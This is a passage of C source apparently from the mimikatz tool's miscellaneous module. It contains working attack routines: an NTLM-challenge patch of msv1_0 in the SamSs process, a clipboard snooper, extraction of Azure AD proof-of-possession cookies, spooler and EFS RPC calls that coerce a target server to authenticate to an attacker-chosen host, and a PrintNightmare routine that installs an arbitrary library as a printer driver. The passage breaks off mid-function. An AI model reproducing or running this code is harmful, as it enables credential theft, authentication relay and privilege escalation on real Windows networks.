	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WI7_SHNM),			PTRN_WI7_SHNM},			{sizeof(PATC_WI7_SHNM),			PATC_WI7_SHNM},			{14}},
	{KULL_M_WIN_BUILD_10_1709,	{sizeof(PTRN_W10_1709_SHNM),	PTRN_W10_1709_SHNM},	{sizeof(PATC_W10_1709_SHNM),	PATC_W10_1709_SHNM},	{0}},
};
#endif
NTSTATUS kuhl_m_misc_easyntlmchall(int argc, wchar_t * argv[])
{
	if((MIMIKATZ_NT_BUILD_NUMBER == (KULL_M_WIN_BUILD_7 + 1)) || (MIMIKATZ_NT_BUILD_NUMBER == KULL_M_WIN_BUILD_10_1709))
		kull_m_patch_genericProcessOrServiceFromBuild(SHNMReferences, ARRAYSIZE(SHNMReferences), L"SamSs", L"msv1_0.dll", TRUE);
	else PRINT_ERROR(L"Windows version is not supported (yet)\n");
	return STATUS_SUCCESS;
}

HWND kuhl_misc_clip_hWnd, kuhl_misc_clip_hWndNextViewer;
DWORD kuhl_misc_clip_dwData, kuhl_misc_clip_seq;
LPBYTE kuhl_misc_clip_Data;

NTSTATUS kuhl_m_misc_clip(int argc, wchar_t * argv[])
{
	WNDCLASSEX myClass;
	ATOM aClass;
	MSG msg;
	BOOL bRet;
	HINSTANCE hInstance = GetModuleHandle(NULL);

	RtlZeroMemory(&myClass, sizeof(WNDCLASSEX));
	myClass.cbSize = sizeof(WNDCLASSEX);
	myClass.lpfnWndProc = kuhl_m_misc_clip_MainWndProc;
	myClass.lpszClassName = MIMIKATZ L"_Window_Message";
	kprintf(L"Monitoring ClipBoard...(CTRL+C to stop)\n\n");
	if(aClass = RegisterClassEx(&myClass))
	{
		if(kuhl_misc_clip_hWnd = CreateWindowEx(0, (LPCWSTR) aClass, MIMIKATZ, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL))
		{
			SetConsoleCtrlHandler(kuhl_misc_clip_WinHandlerRoutine, TRUE);
			kuhl_misc_clip_Data = NULL;
			kuhl_misc_clip_dwData = kuhl_misc_clip_seq = 0;
			kuhl_misc_clip_hWndNextViewer = SetClipboardViewer(kuhl_misc_clip_hWnd);
			while((bRet = GetMessage(&msg, kuhl_misc_clip_hWnd, WM_QUIT, WM_CHANGECBCHAIN)))
			{
				if(bRet > FALSE)
				{
					TranslateMessage(&msg);
					DispatchMessage(&msg);
				}
				else if (bRet < FALSE)
					PRINT_ERROR_AUTO(L"GetMessage");
			}
			if(!ChangeClipboardChain(kuhl_misc_clip_hWnd, kuhl_misc_clip_hWndNextViewer))
				PRINT_ERROR_AUTO(L"ChangeClipboardChain");
			SetConsoleCtrlHandler(kuhl_misc_clip_WinHandlerRoutine, FALSE);
			if(!DestroyWindow(kuhl_misc_clip_hWnd))
				PRINT_ERROR_AUTO(L"DestroyWindow");
		}
		if(!UnregisterClass((LPCWSTR) aClass, hInstance))
			PRINT_ERROR_AUTO(L"UnregisterClass");
	}
	else PRINT_ERROR_AUTO(L"RegisterClassEx");
	return STATUS_SUCCESS;

	//DWORD format;
	//HANDLE hData;
	//wchar_t formatName[256];
	//LPDATAOBJECT data;
	//IEnumFORMATETC *iFormats;

	//FORMATETC re[45];
	//DWORD dw = 0, i;
	//STGMEDIUM medium;
	//
	//if(OpenClipboard(NULL))
	//{
	//	for(format = EnumClipboardFormats(0); format; format = EnumClipboardFormats(format))
	//	{
	//		kprintf(L"* %08x (%5u)\t", format, format);
	//		if(GetClipboardFormatName(format, formatName, ARRAYSIZE(formatName)) > 1)
	//			kprintf(L"%s ", formatName);
	//		if(hData = GetClipboardData(format))
	//			kprintf(L"(size = %u)", (DWORD) GlobalSize(hData));
	//		kprintf(L"\n");
	//	}
	//	CloseClipboard();
	//}

	//if(OleGetClipboard(&data) == S_OK)
	//{
	//	if(IDataObject_EnumFormatEtc(data, DATADIR_GET, &iFormats) == S_OK)
	//	{
	//		kprintf(L"%08x\n", IEnumFORMATETC_Next(iFormats, ARRAYSIZE(re), re, &dw));
	//		for(i = 0; i < dw; i++)
	//		{
	//			kprintf(L"%08x - %5u", re[i].cfFormat, re[i].cfFormat);
	//				kprintf(L"  %u\t", re[i].tymed);

	//			if(IDataObject_GetData(data, &re[i], &medium) == S_OK)
	//			{
	//				kprintf(L"\tT: %08x - %5u", medium.tymed, medium.tymed);
	//				ReleaseStgMedium(&medium);
	//			}
	//			kprintf(L"\n");
	//		}
	//		IEnumFORMATETC_Release(iFormats);
	//	}
	//	IDataObject_Release(data);
	//}
	return STATUS_SUCCESS;
	
}

BOOL WINAPI kuhl_misc_clip_WinHandlerRoutine(DWORD dwCtrlType)
{
	if(kuhl_misc_clip_Data)
		LocalFree(kuhl_misc_clip_Data);
	if(kuhl_misc_clip_hWnd)
		PostMessage(kuhl_misc_clip_hWnd, WM_QUIT, STATUS_ABANDONED, 0);
	return ((dwCtrlType == CTRL_C_EVENT) || (dwCtrlType == CTRL_BREAK_EVENT));
}

LRESULT APIENTRY kuhl_m_misc_clip_MainWndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	LRESULT result = (LRESULT) NULL;
	DWORD curSeq, format, bestFormat = 0, size;
	HANDLE hData;
	BOOL bSameSize = FALSE, bSameData = FALSE;

	switch (uMsg)
	{
	case WM_CHANGECBCHAIN:
		if((HWND) wParam == kuhl_misc_clip_hWndNextViewer) 
			kuhl_misc_clip_hWndNextViewer = (HWND) lParam; 
		else if (kuhl_misc_clip_hWndNextViewer) 
			result = SendMessage(kuhl_misc_clip_hWndNextViewer, uMsg, wParam, lParam); 
		break;
	case WM_DRAWCLIPBOARD:
		curSeq = GetClipboardSequenceNumber();
		if(curSeq != kuhl_misc_clip_seq)
		{
			kuhl_misc_clip_seq = curSeq;
			if(OpenClipboard(hwnd))
			{
				for(format = EnumClipboardFormats(0); format && (bestFormat != CF_UNICODETEXT); format = EnumClipboardFormats(format))
					if((format == CF_TEXT) || (format == CF_UNICODETEXT))
						if(format > bestFormat)
							bestFormat = format;
				if(bestFormat)
				{
					if(hData = GetClipboardData(bestFormat))
					{
						if(size = (DWORD) GlobalSize(hData))
						{
							bSameSize = (size == kuhl_misc_clip_dwData);
							if(bSameSize && kuhl_misc_clip_Data)
								bSameData = RtlEqualMemory(kuhl_misc_clip_Data, hData, size);
							if(!bSameSize)
							{
								if(kuhl_misc_clip_Data)
								{
									kuhl_misc_clip_Data = (PBYTE) LocalFree(kuhl_misc_clip_Data);
									kuhl_misc_clip_dwData = 0;
								}
								if(kuhl_misc_clip_Data = (PBYTE) LocalAlloc(LPTR, size))
									kuhl_misc_clip_dwData = size;
							}
							if(!bSameData && kuhl_misc_clip_Data)
							{
								RtlCopyMemory(kuhl_misc_clip_Data, hData, size);
								kprintf(L"ClipData: ");
								kprintf((bestFormat == CF_UNICODETEXT) ? L"%s\n" : L"%S\n", kuhl_misc_clip_Data);
							}
						}
					}
					else PRINT_ERROR_AUTO(L"GetClipboardData");
				}
				CloseClipboard();
			}
		}
		result = SendMessage(kuhl_misc_clip_hWndNextViewer, uMsg, wParam, lParam); 
		break; 
	default:
		result = DefWindowProc(hwnd, uMsg, wParam, lParam);
	}
	return result;
}

NTSTATUS kuhl_m_misc_xor(int argc, wchar_t * argv[])
{
	BYTE bXor = 0x42;
	LPCWSTR szInput, szOutput, szXor;
	PBYTE data;
	DWORD dwData, i;

	if(kull_m_string_args_byName(argc, argv, L"input", &szInput, NULL))
	{
		if(kull_m_string_args_byName(argc, argv, L"output", &szOutput, NULL))
		{
			if(kull_m_string_args_byName(argc, argv, L"xor", &szXor, NULL))
				bXor = (BYTE) wcstoul(szXor, NULL, 0);

			kprintf(L"Input : %s\nOutput: %s\nXor   : 0x%02x\n\nOpening: ", szInput, szOutput, bXor);
			if(kull_m_file_readData(szInput, &data, &dwData))
			{
				kprintf(L"OK\nWriting: ");
				for(i = 0; i < dwData; i++)
					data[i] ^= bXor;
				if(kull_m_file_writeData(szOutput, data, dwData))
					kprintf(L"OK\n");
				else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
			}
			else PRINT_ERROR_AUTO(L"kull_m_file_readData");
		}
		else PRINT_ERROR(L"An /output:file is needed\n");
	}
	else PRINT_ERROR(L"An /input:file is needed\n");
	return STATUS_SUCCESS;
}

const CLSID CLSID_ProofOfPossessionCookieInfoManager = {0xa9927f85, 0xa304, 0x4390, {0x8b, 0x23, 0xa7, 0x5f, 0x1c, 0x66, 0x86, 0x00}};
const IID IID_IProofOfPossessionCookieInfoManager = {0xcdaece56, 0x4edf, 0x43df, {0xb1, 0x13, 0x88, 0xe4, 0x55, 0x6f, 0xa1, 0xbb}};
NTSTATUS kuhl_m_misc_aadcookie(int argc, wchar_t * argv[])
{
	LPCWSTR szURI;
	IProofOfPossessionCookieInfoManager *pPOPCookieInfoManager = NULL;
	DWORD cookieInfoCount, i;
	ProofOfPossessionCookieInfo *cookieInfo;
	HRESULT hr;

	kull_m_string_args_byName(argc, argv, L"uri", &szURI, L"https://login.microsoftonline.com");
	hr = CoCreateInstance(&CLSID_ProofOfPossessionCookieInfoManager, NULL, CLSCTX_INPROC_SERVER, &IID_IProofOfPossessionCookieInfoManager, (void **) &pPOPCookieInfoManager);
	if(hr == S_OK)
	{
		kprintf(L"URI: %s\n\n", szURI);
		hr = IProofOfPossessionCookieInfoManager_GetCookieInfoForUri(pPOPCookieInfoManager, szURI, &cookieInfoCount, &cookieInfo);
		if(hr == S_OK)
		{
			kprintf(L"Cookie count: %2u\n----------------\n", cookieInfoCount);
			for(i = 0; i < cookieInfoCount; i++)
			{
				kprintf(L"\nCookie %u\n", i);
				kprintf(L"  name     : %s\n", cookieInfo[i].name);
				kprintf(L"  data     : %s\n", cookieInfo[i].data);
				kprintf(L"  flags    : 0x%08x (%u)\n", cookieInfo[i].flags, cookieInfo[i].flags);
				kprintf(L"  p3pHeader: %s\n", cookieInfo[i].p3pHeader);

				CoTaskMemFree(cookieInfo[i].name);      
				CoTaskMemFree(cookieInfo[i].data);      
				CoTaskMemFree(cookieInfo[i].p3pHeader); 
			}
			CoTaskMemFree(cookieInfo);                  
		}
		else PRINT_ERROR(L"GetCookieInfoForUri: 0x%08x\n", hr);
		IProofOfPossessionCookieInfoManager_Release(pPOPCookieInfoManager);
	}
	else PRINT_ERROR(L"CoCreateInstance: 0x%08x\n", hr);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_misc_aadcookie_NgcSignWithSymmetricPopKey(int argc, wchar_t * argv[])
{
	LPCWSTR szKeyValue, szLabel, szContext, szData;
	LPSTR sLabel = NULL, sData = NULL, sSignature64;
	PBYTE pbKeyValue, pbContext = NULL, pbOuput;
	DWORD cbKeyValue, cbContext, cbOutput;

	if(kull_m_string_args_byName(argc, argv, L"keyvalue", &szKeyValue, NULL))
	{
		if(kull_m_string_quick_urlsafe_base64_to_Binary(szKeyValue, &pbKeyValue, &cbKeyValue))
		{
			if(cbKeyValue > (2 * sizeof(DWORD)))
			{
				kull_m_string_args_byName(argc, argv, L"label", &szLabel, L"AzureAD-SecureConversation");
				sLabel = kull_m_string_unicode_to_ansi(szLabel);
				if(kull_m_string_args_byName(argc, argv, L"context", &szContext, NULL))
					kull_m_string_stringToHexBuffer(szContext, &pbContext, &cbContext);
				kull_m_string_args_byName(argc, argv, L"signedinfo", &szData, MIMIKATZ);
				sData = kull_m_string_unicode_to_ansi(szData);

				if(!pbContext)
				{
					cbContext = 24;
					if(pbContext = (PBYTE) LocalAlloc(LPTR, cbContext))
						CDGenerateRandomBits(pbContext, cbContext);
				}

				kprintf(L"\nKeyValue : ");
				kull_m_string_wprintf_hex(pbKeyValue, cbKeyValue, 0);
				kprintf(L"\nLabel    : %S (ascii)\nContext  : ", sLabel);
				kull_m_string_wprintf_hex(pbContext, cbContext, 0);
				kprintf(L"\nData     : %S (ascii)\n", sData);

				if(kull_m_crypto_ngc_signature_pop(pbKeyValue, cbKeyValue, (PBYTE) sLabel, lstrlenA(sLabel), pbContext, cbContext, (PBYTE) sData, lstrlenA(sData), &pbOuput, &cbOutput))
				{
					kprintf(L"\nSignature: ");
					kull_m_string_wprintf_hex(pbOuput, cbOutput, 0);
					if(kull_m_string_quick_binary_to_urlsafe_base64A(pbOuput, cbOutput, &sSignature64))
					{
						kprintf(L" (%S base64)", sSignature64);
						LocalFree(sSignature64);
					}
					kprintf(L"\n");
					LocalFree(pbOuput);
				}

				if(sData)
					LocalFree(sData);
				if(sLabel)
					LocalFree(sLabel);
			}
			else PRINT_ERROR(L"Invalid KeyValue format?\n");
			LocalFree(pbKeyValue);
		}
	}
	else PRINT_ERROR(L"/keyvalue:base64 is needed\n");

	return STATUS_SUCCESS;
}

handle_t hSpoolHandle = NULL;
handle_t __RPC_USER STRING_HANDLE_bind(IN STRING_HANDLE Name) {return hSpoolHandle;}
void __RPC_USER STRING_HANDLE_unbind(IN STRING_HANDLE Name, handle_t hSpool) {}
NTSTATUS kuhl_m_misc_spooler(int argc, wchar_t * argv[])
{
	NTSTATUS status;
	PRINTER_HANDLE hPrinter;
	DEVMODE_CONTAINER Container = {0, NULL};
	DWORD dwRet, AuthnSvc;
	long ret = 0;
	NETRESOURCE nr = {0, RESOURCETYPE_DISK,	0, 0, NULL, NULL, NULL, NULL};
	LPCWSTR szUser, szPassword, szRemote = NULL, szEndpoint, szCallbackTo;
	PWSTR szPathToCallback;

	SEC_WINNT_AUTH_IDENTITY secIdentity = {NULL, 0, NULL, 0, NULL, 0, SEC_WINNT_AUTH_IDENTITY_UNICODE};

	if(kull_m_string_args_byName(argc, argv, L"authuser", &szUser, NULL))
	{
		AuthnSvc = RPC_C_AUTHN_GSS_NEGOTIATE;
		kprintf(L"[auth ] Explicit authentication\n");
		kprintf(L"[auth ] Username: %s\n", szUser);
		secIdentity.User = (USHORT *) szUser;
		secIdentity.UserLength = lstrlen(szUser);

		if(kull_m_string_args_byName(argc, argv, L"authpassword", &szPassword, NULL))
		{
			kprintf(L"[auth ] Password: %s\n", szPassword);
			secIdentity.Password = (USHORT *) szPassword;
			secIdentity.PasswordLength = lstrlen(szPassword);
		}
	}
	else if(kull_m_string_args_byName(argc, argv, L"noauth", NULL, NULL))
	{
		AuthnSvc = RPC_C_AUTHN_NONE;
		kprintf(L"[auth ] None\n");
		szUser = szPassword = L"";
	}
	else
	{
		AuthnSvc = RPC_C_AUTHN_DEFAULT;
		kprintf(L"[auth ] Default (current)\n");
		szUser = szPassword = NULL;
	}

	kull_m_string_args_byName(argc, argv, L"endpoint", &szEndpoint, L"\\pipe\\spoolss");
	kprintf(L"[ rpc ] Endpoint: %s\n", szEndpoint);

	if(kull_m_string_args_byName(argc, argv, L"server", &szRemote, NULL) || kull_m_string_args_byName(argc, argv, L"target", &szRemote, NULL))
	{
		if(kull_m_string_args_byName(argc, argv, L"connect", &szCallbackTo, NULL) || kull_m_string_args_byName(argc, argv, L"callback", &szCallbackTo, NULL))
		{
			if(kull_m_string_sprintf(&nr.lpRemoteName, L"\\\\%s\\IPC$", szRemote))
			{
				if(kull_m_string_sprintf(&szPathToCallback, L"\\\\%s", szCallbackTo))
				{
					kprintf(L"[trans] Disconnect eventual IPC: ");
					dwRet = WNetCancelConnection2(nr.lpRemoteName, 0, TRUE);
					if((dwRet == NO_ERROR) || (dwRet == ERROR_NOT_CONNECTED))
					{
						kprintf(L"OK\n[trans] Connect to IPC: ");
						dwRet = WNetAddConnection2(&nr, szPassword, szUser, CONNECT_TEMPORARY);
						if(dwRet == NO_ERROR)
						{
							kprintf(L"OK\n");
							if(kull_m_rpc_createBinding(NULL, L"ncacn_np", szRemote, szEndpoint, L"spooler", TRUE, AuthnSvc, secIdentity.UserLength ? &secIdentity : NULL, RPC_C_IMP_LEVEL_DEFAULT, &hSpoolHandle, NULL))
							{
								kprintf(L"[ rpc ] Resolve Endpoint: ");
								status = RpcEpResolveBinding(hSpoolHandle, &winspool_v1_0_c_ifspec);
								if(status == RPC_S_OK)
								{
									kprintf(L"OK\n\n");
									RpcTryExcept
									{
										ret = RpcOpenPrinter(NULL, &hPrinter, NULL, &Container, GENERIC_READ);
										if(ret == ERROR_SUCCESS)
										{
											ret = RpcRemoteFindFirstPrinterChangeNotification(hPrinter, PRINTER_CHANGE_ALL, PRINTER_NOTIFY_CATEGORY_ALL, szPathToCallback, 42, 0, NULL);
											if(ret == ERROR_SUCCESS)
											{
												kprintf(L"Connected to the target, and notification is OK (?!)\n");
												ret = RpcFindClosePrinterChangeNotification(hPrinter);
												if(ret != ERROR_SUCCESS)
												{
													PRINT_ERROR(L"RpcFindClosePrinterChangeNotification: 0x%08x\n", ret);
												}
											}
											else if(ret == ERROR_ACCESS_DENIED)
											{
												kprintf(L"Access is denied (can be OK)\n");
											}
											else PRINT_ERROR(L"RpcRemoteFindFirstPrinterChangeNotification: 0x%08x\n", ret);

											ret = RpcClosePrinter(&hPrinter);
											if(ret != ERROR_SUCCESS)
											{
												PRINT_ERROR(L"RpcClosePrinter: 0x%08x\n", ret);
											}
										}
										else PRINT_ERROR(L"RpcOpenPrinter: 0x%08x\n", ret);
									}
									RpcExcept(RPC_EXCEPTION)
										PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
									RpcEndExcept

									kprintf(L"\n");
								}
								else PRINT_ERROR(L"RpcEpResolveBinding: 0x%08x\n", status);
								
								kull_m_rpc_deleteBinding(&hSpoolHandle);
							}

							kprintf(L"[trans] Disconnect IPC: ");
							dwRet = WNetCancelConnection2(nr.lpRemoteName, 0, TRUE);
							if(dwRet == NO_ERROR)
							{
								kprintf(L"OK\n");
							}
							else PRINT_ERROR(L"WNetCancelConnection2: 0x%08x\n");
						}
						else PRINT_ERROR(L"WNetAddConnection2:%u\n", dwRet);
					}
					else PRINT_ERROR(L"WNetCancelConnection2: %u\n", dwRet);

					LocalFree(szPathToCallback);
				}
				LocalFree(nr.lpRemoteName);
			}
		}
		else PRINT_ERROR(L"missing /connect argument to specify notifications target");
	}
	else PRINT_ERROR(L"missing /server argument to specify spooler server");

	return STATUS_SUCCESS;
}

// Inspired from PetitPotam (https://github.com/topotam/PetitPotam) by topotam (@topotam77)
NTSTATUS kuhl_m_misc_efs(int argc, wchar_t * argv[])
{
	NTSTATUS status;
	RPC_BINDING_HANDLE hEfsHandle;
	PEXIMPORT_CONTEXT_HANDLE hImportCtx;
	DWORD dwRet, AuthnSvc;
	long ret = 0;
	NETRESOURCE nr = {0, RESOURCETYPE_DISK,	0, 0, NULL, NULL, NULL, NULL};
	LPCWSTR szUser, szPassword, szRemote = NULL, szEndpoint, szCallbackTo;
	PWSTR szCallbackToShare;

	SEC_WINNT_AUTH_IDENTITY secIdentity = {NULL, 0, NULL, 0, NULL, 0, SEC_WINNT_AUTH_IDENTITY_UNICODE};

	if(kull_m_string_args_byName(argc, argv, L"authuser", &szUser, NULL))
	{
		AuthnSvc = RPC_C_AUTHN_GSS_NEGOTIATE;
		kprintf(L"[auth ] Explicit authentication\n");
		kprintf(L"[auth ] Username: %s\n", szUser);
		secIdentity.User = (USHORT *) szUser;
		secIdentity.UserLength = lstrlen(szUser);

		if(kull_m_string_args_byName(argc, argv, L"authpassword", &szPassword, NULL))
		{
			kprintf(L"[auth ] Password: %s\n", szPassword);
			secIdentity.Password = (USHORT *) szPassword;
			secIdentity.PasswordLength = lstrlen(szPassword);
		}
	}
	else if(kull_m_string_args_byName(argc, argv, L"noauth", NULL, NULL))
	{
		AuthnSvc = RPC_C_AUTHN_NONE;
		kprintf(L"[auth ] None\n");
		szUser = szPassword = L"";
	}
	else
	{
		AuthnSvc = RPC_C_AUTHN_DEFAULT;
		kprintf(L"[auth ] Default (current)\n");
		szUser = szPassword = NULL;
	}

	kull_m_string_args_byName(argc, argv, L"endpoint", &szEndpoint, L"\\pipe\\lsarpc");
	kprintf(L"[ rpc ] Endpoint: %s\n", szEndpoint);

	if(kull_m_string_args_byName(argc, argv, L"server", &szRemote, NULL) || kull_m_string_args_byName(argc, argv, L"target", &szRemote, NULL))
	{
		if(kull_m_string_args_byName(argc, argv, L"connect", &szCallbackTo, NULL) || kull_m_string_args_byName(argc, argv, L"callback", &szCallbackTo, NULL))
		{
			if(kull_m_string_sprintf(&nr.lpRemoteName, L"\\\\%s\\IPC$", szRemote))
			{
				if(kull_m_string_sprintf(&szCallbackToShare, L"\\\\%s\\" MIMIKATZ L"\\" MIMIKATZ, szCallbackTo))
				{
					kprintf(L"[trans] Disconnect eventual IPC: ");
					dwRet = WNetCancelConnection2(nr.lpRemoteName, 0, TRUE);
					if((dwRet == NO_ERROR) || (dwRet == ERROR_NOT_CONNECTED))
					{
						kprintf(L"OK\n[trans] Connect to IPC: ");
						dwRet = WNetAddConnection2(&nr, szPassword, szUser, CONNECT_TEMPORARY);
						if(dwRet == NO_ERROR)
						{
							kprintf(L"OK\n");
							if(kull_m_rpc_createBinding(NULL, L"ncacn_np", szRemote, szEndpoint, L"host", TRUE, AuthnSvc, secIdentity.UserLength ? &secIdentity : NULL, RPC_C_IMP_LEVEL_DEFAULT, &hEfsHandle, NULL))
							{
								kprintf(L"[ rpc ] Resolve Endpoint: ");
								status = RpcEpResolveBinding(hEfsHandle, &efsrpc_v1_0_c_ifspec);
								if(status == RPC_S_OK)
								{
									kprintf(L"OK\n\n");
									RpcTryExcept
									{
										ret = EfsRpcOpenFileRaw(hEfsHandle, &hImportCtx, szCallbackToShare, 0);
										if(ret == ERROR_BAD_NETPATH)
										{
											kprintf(L"Remote server reported bad network path! (OK)\n> Server (%s) may have tried to authenticate (to: %s)\n", szRemote, szCallbackTo);
										}
										else if(ret == 0)
										{
											PRINT_ERROR(L"EfsRpcOpenFileRaw is a success, really? (not normal)\n");
											EfsRpcCloseRaw(&hImportCtx);
										}
										else
										{
											PRINT_ERROR(L"EfsRpcOpenFileRaw: %u\n", ret);
										}
									}
									RpcExcept(RPC_EXCEPTION)
										PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
									RpcEndExcept

									kprintf(L"\n");
								}
								else PRINT_ERROR(L"RpcEpResolveBinding: 0x%08x\n", status);
								
								kull_m_rpc_deleteBinding(&hEfsHandle);
							}

							kprintf(L"[trans] Disconnect IPC: ");
							dwRet = WNetCancelConnection2(nr.lpRemoteName, 0, TRUE);
							if(dwRet == NO_ERROR)
							{
								kprintf(L"OK\n");
							}
							else PRINT_ERROR(L"WNetCancelConnection2: 0x%08x\n");
						}
						else PRINT_ERROR(L"WNetAddConnection2:%u\n", dwRet);
					}
					else PRINT_ERROR(L"WNetCancelConnection2: %u\n", dwRet);

					LocalFree(szCallbackToShare);
				}
				LocalFree(nr.lpRemoteName);
			}
		}
		else PRINT_ERROR(L"missing /connect argument to specify notifications target");
	}
	else PRINT_ERROR(L"missing /server argument to specify spooler server");

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
{
	RPC_STATUS rpcStatus;
	BOOL bIsPar, bIsX64;
	DWORD AuthnSvc;
	LPCWSTR szLibrary, szRemote, szProtSeq, szEndpoint, szService, szForce;
	LPWSTR szRand;
	SEC_WINNT_AUTH_IDENTITY secIdentity = {NULL, 0, NULL, 0, NULL, 0, SEC_WINNT_AUTH_IDENTITY_UNICODE};
	DRIVER_INFO_2 DriverInfo = {3, NULL, NULL, NULL, NULL, NULL,};

	kull_m_rpc_getArgs(argc, argv, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, &secIdentity, NULL, TRUE);
	if(kull_m_string_args_byName(argc, argv, L"server", &szRemote, NULL))
	{
		bIsPar = TRUE;
		szProtSeq = L"ncacn_ip_tcp";
		szEndpoint = NULL;
		szService = L"host";
		AuthnSvc = RPC_C_AUTHN_GSS_NEGOTIATE;
		kprintf(L"[ms-par/ncacn_ip_tcp] remote: %s\n", szRemote);
	}
	else
	{
		bIsPar = FALSE;
		szProtSeq = L"ncalrpc";
		szEndpoint = (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8) ? L"spoolss" : NULL;
		szRemote = NULL;
		szService = NULL;
		AuthnSvc = RPC_C_AUTHN_LEVEL_DEFAULT;
		rpcStatus = RPC_S_OK;
		kprintf(L"[ms-rprn/ncalrpc] local\n");
	}

	if(kull_m_string_args_byName(argc, argv, L"x64", NULL, NULL) || kull_m_string_args_byName(argc, argv, L"win64", NULL, NULL))
	{
		bIsX64 = TRUE;
	}
	else if(kull_m_string_args_byName(argc, argv, L"x86", NULL, NULL) || kull_m_string_args_byName(argc, argv, L"win32", NULL, NULL))
	{
		bIsX64 = FALSE;
	}
	else
	{
#if defined(_M_X64) || defined(_M_ARM64) // :')
		bIsX64 = TRUE;
#elif defined(_M_IX86)
		bIsX64 = FALSE;
#endif
	}
	
	if(kull_m_rpc_createBinding(NULL, szProtSeq,  szRemote, szEndpoint, szService, bIsPar, AuthnSvc, secIdentity.UserLength ? &secIdentity : NULL, RPC_C_IMP_LEVEL_DELEGATE, &hSpoolHandle, NULL))
	{
		if(bIsPar)
		{
			rpcStatus = RpcBindingSetObject(hSpoolHandle, (UUID *) &PAR_ObjectUUID);
			if(rpcStatus != RPC_S_OK)
			{
				PRINT_ERROR(L"RpcBindingSetObject: 0x%08x (%u)\n", rpcStatus, rpcStatus);
			}
		}

		if(rpcStatus == RPC_S_OK)
		{
			DriverInfo.pEnvironment = bIsX64 ? L"Windows x64" : L"Windows NT x86";
			if(kull_m_string_args_byName(argc, argv, L"library", &szLibrary, NULL))
			{
				if(kuhl_m_misc_printnightmare_normalize_library(bIsPar, szLibrary, &DriverInfo.pConfigFile, NULL))
				{
					szForce = kull_m_string_args_byName(argc, argv, L"useown", NULL, NULL) ? DriverInfo.pConfigFile : NULL;

					szRand = kull_m_string_getRandomGUID();
					if(szRand)
					{
						if(kull_m_string_sprintf(&DriverInfo.pName, MIMIKATZ L"-%s-legitprinter", szRand))
						{
							if(kuhl_m_misc_printnightmare_FillStructure(&DriverInfo, bIsX64, !kull_m_string_args_byName(argc, argv, L"nodynamic", NULL, NULL), szForce, bIsPar, hSpoolHandle))
							{
								if(kuhl_m_misc_printnightmare_AddPrinterDriver(bIsPar, hSpoolHandle, &DriverInfo, APD_COPY_FROM_DIRECTORY | APD_COPY_NEW_FILES | APD_INSTALL_WARNED_DRIVER))
								{
									if(!bIsPar) // we can't remotely with normal user, use /clean with > rights
									{
										kuhl_m_misc_printnightmare_DeletePrinterDriver(bIsPar, hSpoolHandle, DriverInfo.pEnvironment, DriverInfo.pName);
									}
								}
								
								LocalFree(DriverInfo.pDataFile);
								LocalFree(DriverInfo.pDriverPath);
							}
							LocalFree(DriverInfo.pName);
						}
						LocalFree(szRand);
					}
					LocalFree(DriverInfo.pConfigFile);
				}
			}
			else
			{
				kuhl_m_misc_printnightmare_ListPrintersAndMaybeDelete(bIsPar, hSpoolHandle, DriverInfo.pEnvironment, kull_m_string_args_byName(argc, argv, L"clean", NULL, NULL));
			}
		}

		kull_m_rpc_deleteBinding(&hSpoolHandle);
	}

	return STATUS_SUCCESS;
}

BOOL kuhl_m_misc_printnightmare_normalize_library(BOOL bIsPar, LPCWSTR szLibrary, LPWSTR *pszNormalizedLibrary, LPWSTR *pszShortLibrary)
{
	BOOL status = FALSE;
	LPCWSTR szPtr;
	
	szPtr = wcsstr(szLibrary, L"\\\\");
	if(szPtr != szLibrary)
	{
		szPtr = wcsstr(szLibrary, L"//");
	}
		
	if(szPtr == szLibrary)
	{
		status = kull_m_string_sprintf(pszNormalizedLibrary, L"\\??\\UNC\\%s", szLibrary + 2);
	}
	else
	{
		if(!bIsPar)
		{
			status = kull_m_file_getAbsolutePathOf(szLibrary, pszNormalizedLibrary);
		}
		else
		{
			status = kull_m_string_copy(pszNormalizedLibrary, szLibrary);
		}
	}

	if(status)
	{
		if(pszShortLibrary)
		{
			status = FALSE;
			*pszShortLibrary = wcsrchr(*pszNormalizedLibrary, L'\\');
			if(*pszShortLibrary && *(*pszShortLibrary + 1))
			{
				(*pszShortLibrary)++;
				status = TRUE;
			}
			else
			{
				PRINT_ERROR(L"Unable to get short library name from library path (%s)\n", *pszNormalizedLibrary);
				LocalFree(*pszNormalizedLibrary);
			}
		}
	}
	else PRINT_ERROR_AUTO(L"kull_m_string_sprintf/kull_m_string_copy");

	return status;
}

BOOL kuhl_m_misc_printnightmare_FillStructure(PDRIVER_INFO_2 pInfo2, BOOL bIsX64, BOOL bIsDynamic, LPCWSTR szForce, BOOL bIsPar, handle_t hRemoteBinding)
{
	BOOL status = FALSE;
	LPWSTR szPrinterDriverDirectory = NULL;
	wchar_t szDynamicPrinterDriverDirectory[MAX_PATH + 1];
	DWORD ret, cbNeeded;

	if(szForce)
	{
		kprintf(L"| force driver/data: %s\n", szForce);
		if(kull_m_string_copy(&pInfo2->pDriverPath, szForce))
		{
			if(kull_m_string_copy(&pInfo2->pDataFile, szForce))
			{
				status = TRUE;
			}
			else LocalFree(&pInfo2->pDriverPath);
		}
	}
	else
	{
		if(!bIsDynamic)
		{
			kull_m_string_sprintf(&szPrinterDriverDirectory, L"c:\\windows\\system32\\spool\\drivers\\%s", bIsX64 ? L"x64" : L"W32X86");
			kprintf(L"| static: %s\n", szPrinterDriverDirectory);
		}
		else
		{
			RpcTryExcept
			{
				if(bIsPar)
				{
					kprintf(L"> RpcAsyncGetPrinterDriverDirectory: ");
					ret = RpcAsyncGetPrinterDriverDirectory(hRemoteBinding, NULL, pInfo2->pEnvironment, 1, (unsigned char *) szDynamicPrinterDriverDirectory, sizeof(szDynamicPrinterDriverDirectory), &cbNeeded);
				}
				else
				{
					kprintf(L"> RpcGetPrinterDriverDirectory: ");
